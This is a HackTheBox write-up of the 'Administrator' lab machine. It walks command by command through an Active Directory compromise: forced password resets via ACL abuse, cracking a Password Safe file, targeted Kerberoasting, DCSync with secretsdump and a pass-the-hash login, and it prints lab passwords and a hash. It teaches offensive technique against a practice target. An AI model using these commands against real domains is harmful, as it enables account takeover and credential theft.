# Administrator — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Medium
**OS:** Windows

---

## TL;DR

Initial access is provided via given credentials (`Olivia:ichliebedich`) → Running Bloodhound reveals `Olivia` has `GenericAll` privileges over the user `Michael` → We reset Michael's password and log in → Bloodhound shows `Michael` has permission to reset `Benjamin`'s password → We reset Benjamin's password using PowerView and log into his account → As a member of the Share Moderators group, `Benjamin` has access to an SMB/FTP share containing a Password Safe file (`Backup.psafe3`) → We extract the hash (`pwsafe2john`) and crack it (`tekieromucho`) to open the safe → The safe contains credentials for `Emily` → Since we cannot change her password directly, we perform a Targeted Kerberoast attack using her credentials to retrieve the Service Principal Name (SPN) ticket for `Ethan` → Cracking Ethan's ticket (`limpbizkit`) reveals he has `DCSync` rights → We use `secretsdump` to extract the `Administrator` NTLM hash and gain `SYSTEM` access via Pass-the-Hash.

---

## Enumeration

Full nmap scan:

```bash
nmap -sC -sV -p- -n -Pn --min-rate=9018 10.10.11.42
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | Microsoft ftpd |
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 135 | RPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 389 | LDAP | Microsoft Windows AD LDAP (Domain: administrator.htb) |
| 445 | SMB | microsoft-ds |
| 464 | kpasswd | kpasswd5 |
| 593 | RPC over HTTP| Microsoft Windows RPC over HTTP 1.0 |
| 636 | LDAPSSL | tcpwrapped |
| 3268 | Global Cat.| Microsoft Windows AD LDAP |
| 3269 | Global Cat.| tcpwrapped |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |

The target is a Windows Domain Controller for the domain `administrator.htb`. We add this to our `/etc/hosts` file.

**Initial Access:**
For this machine, we are provided with a set of starting Active Directory credentials:
`Olivia : ichliebedich`

---

## Exploitation — Bloodhound & Password Resets

We use the provided credentials to map the Active Directory environment using the Python ingestor for Bloodhound:

```bash
bloodhound-python -u Olivia -p ichliebedich -d administrator.htb -c all --zip -ns 10.10.11.42
```

We load the resulting ZIP file into the Bloodhound GUI. 
Analyzing the shortest paths to high-value targets, we discover our starting user, `Olivia`, holds `GenericAll` privileges over another user named `Michael`. 

`GenericAll` grants full control over the target object, which inherently includes the ability to forcefully change their password. We reset Michael's password from our attacking machine:

```bash
net rpc password "michael" "Password123!" -U "administrator.htb/Olivia"%"ichliebedich" -S 10.10.11.42
```
*(Alternatively, we can use `rpcclient` or PowerView if executing from a Windows context).*

With control of `Michael`, we return to Bloodhound to check his privileges. We discover that `Michael` has the specific right to reset the password for `Benjamin`. 

We reset `Benjamin`'s password. (The raw notes use PowerShell/PowerView format, which can be executed if we have a shell, or we can repeat the remote RCP password reset):

```powershell
Set-ADAccountPassword -Identity benjamin -Reset -NewPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)
```

We now have control of the `Benjamin` account (`Benjamin : P@ssw0rd123!`).

---

## Privilege Escalation — Password Safes & Targeted Kerberoasting

Checking `Benjamin`'s group memberships, we see he is part of the "Share Moderators" group. We use `smbclient` or `ftp` to check for accessible shares. In a restricted share, we find a backup file: `Backup.psafe3`.

A `.psafe3` file is an encrypted password database created by the application Password Safe. To open it, we must crack the master password.

First, we extract the hash using `pwsafe2john`:

```bash
pwsafe2john Backup.psafe3 > backup.hash
```

Next, we crack the hash using John the Ripper (or Hashcat) and the RockYou wordlist:

```bash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The master password cracks to: `tekieromucho`.

We install the `pwsafe` utility on our Kali machine (or use a compatible GUI) to open the database:

```bash
pwsafe Backup.psafe3
```

Inside the vault, we find passwords for three users. The most interesting account is `Emily`, as her group memberships (viewed in Bloodhound) suggest a path to persistence or escalation.
`Emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

We attempt to change her password or move laterally, but face restrictions. However, looking at the AD configuration, we realize we can leverage her credentials to perform a **Targeted Kerberoast** attack against the user `Ethan`.

We use the `targetedKerberoast.py` script from the Impacket suite/Impacket-extensions. By authenticating as `Emily`, we request an SPN ticket for `Ethan`:

```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

The domain controller responds with Ethan's Kerberos TGS ticket (Hashcat format `$krb5tgs$23`).

We save the output to `ethan.hash` and crack it using Hashcat:

```bash
hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
```

The password cracks to: `ethan : limpbizkit`.

Consulting Bloodhound one final time, we find that the `Ethan` account has `DS-Replication-Get-Changes-All` privileges over the domain. This means Ethan has the right to perform a **DCSync attack**.

We use Impacket's `secretsdump.py` to execute the DCSync attack and dump the NTLM hash of the built-in Domain Administrator:

```bash
impacket-secretsdump 'administrator.htb/ethan:limpbizkit'@10.10.11.42
```

The tool successfully synchronizes with the Domain Controller and returns the `Administrator` hash:
`Administrator : 3dc553ce4b9fd20bd016e098d2d2fd2e`

We use Evil-WinRM to perform a Pass-the-Hash (PtH) attack:

```bash
evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

We are `NT AUTHORITY\SYSTEM`. **Root.** 🎉

---

## Key Takeaways

- **AD ACL Abuse:** The core of this machine is abusing Active Directory Access Control Lists (ACLs). Having `GenericAll` or `ForceChangePassword` rights over other users creates a domino effect, allowing an attacker to hop from a low-privileged user all the way to Domain Admin without ever executing an exploit.
- **Targeted Kerberoasting:** Standard Kerberoasting looks for accounts that *already* have an SPN set. Targeted Kerberoasting involves finding an account that *has the rights to write SPNs to another account*, adding an SPN to that target, kerberoasting them, and then reverting the change.
- **DCSync:** The `DS-Replication` privilege should be strictly monitored and reserved only for actual Domain Controllers or synchronization services like Azure AD Connect.

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*